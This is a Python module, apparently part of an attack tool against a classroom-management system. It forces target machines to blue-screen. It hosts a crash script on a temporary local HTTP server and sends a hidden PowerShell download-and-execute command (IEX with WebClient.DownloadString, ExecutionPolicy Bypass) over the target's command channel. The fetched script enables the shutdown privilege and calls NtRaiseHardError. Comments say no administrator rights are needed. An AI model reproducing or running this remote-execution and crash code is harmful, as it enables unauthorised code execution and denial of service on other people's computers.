"""蓝屏载荷：把脚本挂在本机临时 HTTP 服务上，由目标自己取回执行。

脚本有三百多个字符，超过命令通道单条 163 个 UTF-16 单元的上限。早先按 base64
分片写临时文件要连发六七条报文，目标侧常常只执行其中几条，落地的文件不全就解
不出脚本；改成托管后只发一条命令，与反弹终端下发脚本的做法一致。

流程：挑目标能回连的本机地址 → 起一个随机端口的临时 HTTP 服务，只回同一份
脚本 → 下发一条「下载并立即执行」的 PowerShell 命令 → 目标取回后脚本自己启用
关机特权并调用 NtRaiseHardError。
"""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Event, Lock, Thread, Timer

from NeoJiYuTrainer.packets.codec import pkg_sendlist
from NeoJiYuTrainer.packets.constants import (
    BLUE_SCREEN_PATH,
    BLUE_SCREEN_SCRIPT,
    BLUE_SCREEN_SERVE_SECONDS,
    BLUE_SCREEN_WAIT_SECONDS,
)
from NeoJiYuTrainer.system.net.local import detect_local_ip

# 当前托管的服务：一轮发送里多台目标取的是同一份脚本，端口不必换；
# 服务到期自关后下一次发声再新建一个。
_server = None
_server_lock = Lock()


class BlueScreenServer:
    """临时托管的 HTTP 服务：任何路径都回同一份脚本，取走后等超时自关。"""

    def __init__(self, host):
        """初始化服务。

        Args:
            host: 目标回连用的本机 IPv4 地址，监听端口由系统分配。
        """
        self.host = host
        self.served = Event()
        self._httpd = None
        self._thread = None
        self._closed = False

    @property
    def url(self):
        """返回目标下载脚本用的地址，未启动时端口为 0。"""
        port = self._httpd.server_address[1] if self._httpd else 0
        return "http://%s:%d%s" % (self.host, port, BLUE_SCREEN_PATH)

    @property
    def closed(self):
        """服务是否已经关闭。"""
        return self._closed

    def start(self):
        """开始监听，并在 ``BLUE_SCREEN_SERVE_SECONDS`` 秒后自动关闭。"""
        body = BLUE_SCREEN_SCRIPT.encode("utf-8")
        served = self.served

        class Handler(BaseHTTPRequestHandler):
            """任何路径都回同一份脚本，目标取走时记一次。"""

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                served.set()

            def log_message(self, *_args):
                """不往标准错误写访问日志。"""

        self._httpd = ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self._thread = Thread(
            target=self._httpd.serve_forever,
            kwargs={"poll_interval": 0.1},
            daemon=True,
        )
        self._thread.start()
        timer = Timer(BLUE_SCREEN_SERVE_SECONDS, self.close)
        # 定时器也是线程，非守护的话界面退出会一直等它。
        timer.daemon = True
        timer.start()

    def wait(self, timeout=BLUE_SCREEN_WAIT_SECONDS):
        """等目标把脚本取走。

        Args:
            timeout: 最长等待秒数。

        Returns:
            bool: 目标已取回脚本时为 True，超时或提前关闭时为 False。
        """
        return self.served.wait(timeout)

    def close(self):
        """停止监听并等线程退出，可重复调用。"""
        if self._closed:
            return
        self._closed = True
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd.server_close()
        if self._thread is not None:
            self._thread.join(1)


def _running_server(target=None):
    """返回正在托管的服务，没有就新建一个。

    Args:
        target: 目标地址，用来挑目标回连得到的本机网卡。

    Returns:
        BlueScreenServer: 已启动的服务。
    """
    global _server
    host = detect_local_ip(target)
    with _server_lock:
        if _server is not None and not _server.closed and _server.host == host:
            return _server
        if _server is not None:
            _server.close()
        server = BlueScreenServer(host)
        server.start()
        _server = server
        return server


def blue_screen_command(target=None):
    """返回下发给目标的那条命令：取回脚本并立即执行。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址；省略时按通用网卡探测。

    Returns:
        str: 一条可以直接走远程命令通道的命令。
    """
    url = _running_server(target).url
    return (
        "powershell -w hidden -ExecutionPolicy Bypass -c "
        "\"IEX((New-Object Net.WebClient).DownloadString('%s'))\"" % url
    )


def blue_screen_packets(target=None):
    """返回蓝屏所需的报文：一条取回脚本的命令。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址；省略时按通用网卡探测。

    Returns:
        list[list[int]]: 待发送的命令报文。
    """
    return [pkg_sendlist("-c", blue_screen_command(target))]


def payload_hint():
    """返回载荷说明的中文提示，供 DEBUG 日志使用。

    目标只需普通用户令牌即可执行：关机特权在工作站默认授予 Users，脚本自行
    启用后调用内核接口，不建计划任务，也不需要管理员。

    Returns:
        str: 形如「脚本由本机临时 HTTP 托管…；报文 1 条」。
    """
    return (
        "脚本由本机临时 HTTP 托管，目标取回后启用关机特权并调用 "
        "NtRaiseHardError；报文 1 条"
    )


def wait_for_blue_screen(timeout=BLUE_SCREEN_WAIT_SECONDS):
    """等目标取回脚本，供发完就退出的命令行使用。

    Args:
        timeout: 最长等待秒数。

    Returns:
        bool: 目标已取回脚本时为 True。
    """
    with _server_lock:
        server = _server
    return server is not None and server.wait(timeout)
